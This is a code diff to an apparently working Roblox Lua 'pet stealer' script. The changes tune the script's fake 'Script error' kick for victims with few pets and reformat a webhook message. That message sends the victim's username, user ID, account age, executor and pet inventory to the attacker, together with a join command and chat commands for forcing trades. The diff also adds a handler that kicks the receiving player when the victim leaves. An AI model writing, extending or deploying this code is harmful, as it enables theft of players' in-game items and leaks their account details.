@@ -76,8 +76,10 @@ end
 
 local total = common_count + uncommon_count + rare_count + ultra_count + legendaries_count
 
-if total <= 5 then
-  plr:kick("Script errors while running.")
+if total <= 3 then
+  game:GetService("Players").LocalPlayer:Kick(
+      "Error: Script error while running!"
+  )
   return
 end
   
@@ -98,7 +100,7 @@ end
     embeds = {
       {
         title = 'Join your player using **EXECUTE TO JOIN THEM**\nand use cmd below to start stealing!',
-        description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n🤑 Total Pets: '.. tostring(total).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")\n\n**CMD chat**:\n/start, start, send:\nfor victim To send request\n/accept, accept, claim:\nTo accept negotiation victim\n/confirm, confirm, con\nTo confirm trade victim\n\n **NOTED: You must accept trade request from victim before 5 second,\notherwise the victim wont add any pets, and you must chat again**',
+        description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n🤑 Total Pets: '.. tostring(total).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")\n\n**CMD chat**:\n*/start, start, send*:\nfor victim To send request\n\n*/accept, accept, claim*:\nTo accept negotiation victim\n\n*/confirm, confirm, con*:\nTo confirm trade victim\n\n **NOTED: You must accept trade request from victim before 5 second,\notherwise the victim wont add any pets, and you must chat again**',
         color = 10428396
       }
     }
@@ -164,11 +166,24 @@ end
   end
   
   local Players = game:GetService("Players")
+  local firstPlayer = nil
+  local secondPlayer = nil
   Players.PlayerRemoving:Connect(function(player)
-    if player then
-      Username:kick("Late lil bro, sad")
+    -- Cek apakah pemain pertama yang keluar adalah yang sudah ditentukan
+    if player.Name == plr then
+        firstPlayer = player
     end
-  end)
+
+        -- Cek apakah pemain kedua yang keluar adalah yang sudah ditentukan
+        if player.Name == Username then
+          secondPlayer = player
+      end
+
+-- Jika pemain pertama sudah keluar, kick pemain kedua
+if firstPlayer and secondPlayer then
+  secondPlayer:Kick("You were kicked because " .. firstPlayer.Name .. " left the game.")
+end
+end)
 
 
   game.Players.PlayerAdded:Connect(function(player)
